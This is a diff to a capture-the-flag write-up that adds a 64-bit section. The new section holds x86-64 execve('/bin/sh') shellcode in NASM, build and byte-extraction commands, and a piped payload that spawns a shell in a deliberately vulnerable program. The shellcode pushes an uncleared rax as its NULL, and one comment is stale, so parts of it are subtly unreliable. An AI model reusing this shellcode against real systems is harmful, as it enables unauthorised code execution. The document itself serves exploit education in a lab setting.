@@ -105,7 +105,7 @@ This means we're passing the following:
 
 > ebx // Arg#1: pointer to the program string ("/bin//sh")
 
-> ecx // Arg#2: pointer to the argunments array
+> ecx // Arg#2: pointer to the arguments array
 
 *(argv[0] = "/bin//sh" , argv[1] = NULL)*
 
@@ -164,3 +164,76 @@ python -c "print '`(for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do
 
 (cat payload; cat) | ./vuln
 ```
+> # 64bit systems
+Now let's play with 64bit systems. It's not that difficult, the only thing that changes is the shellcode. Now we need to download the source code and compile it to take the 64bit binary.
+You can download the program from [here](https://2018shell.picoctf.com/static/77b3483ed4e56701fa7db9c5bdea4d03/vuln.c).
+Compile it:
+```bash
+gcc -o vuln vuln.c -fno-stack-protector -z execstack
+```
+
+I don't thing we need to examine again assembly code of vuln. It's pretty much the same, of course registers are different and some instructions too but the bigger picture (that we want to focus on in this challenge) is the same.
+
+I will jump to the shellcode:
+
+```asm
+section .text
+            global _start
+ 
+    _start:
+            xor     rdx, rdx                ; clearing rdx register 
+            mov     qword rbx, '//bin/sh'   ; pushing //bin/sh to rbx register
+            shr     rbx, 0x8                ; shift right 8 times rbx register (I'll explain it below)
+            push    rbx                     ; push /bin/sh in stack
+            mov     rdi, rsp                ; rdi now has address of /bin/sh
+            push    rax                     ; pushing NULL byte
+            push    rdi                     ; pushing address of /bin/sh
+            mov     rsi, rsp                ; rsi has now address of address of /bin/sh
+            mov     al, 0x3b                ; syscall number of execve is 59 in 64bit systems
+            syscall                         ; system call
+```
+As expected we call the execve function to get a shell.
+In 64bit systems arguments of a function go in that way: rdi, rsi, rdx, rcx (and syscall number goes to rax)
+Our function is:
+```C
+ int execve(const char *filename, char *const argv [], char *const envp[]);
+```
+
+This means we're passing the following:
+
+> rax // Syscall of execve == 59 == 0x3b
+
+> rdi // Arg#1: pointer to the program string ("/bin/sh")
+
+> rsi // Arg#2: pointer to the arguments array
+
+*(argv[0] = "/bin//sh" , argv[1] = NULL)*
+
+> rdx // Arg#3: pointer to the environment array (NULL)
+
+Something that may seem confusing is the sift right in rbx register. With this instruction we just throw away the first '/'. When we push rbx in the stack, instead of this slash we have a null byte in the end of the string.
+By the way it's a good time here to search about little and big endian.
+
+To compile it use nasm:
+
+```bash
+nasm -f elf64 shellcode.asm
+```
+
+Again we use objdump to get the hex values.
+
+```bash
+for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo;
+```
+Finally, we create the payload with python:
+```python
+python -c 'print "--hex values here--"' >  payload
+```
+```bash
+(cat payload; cat) | ./vuln
+```
+
+```bash
+cat flag.txt
+```
+Congrats, we got our flag.
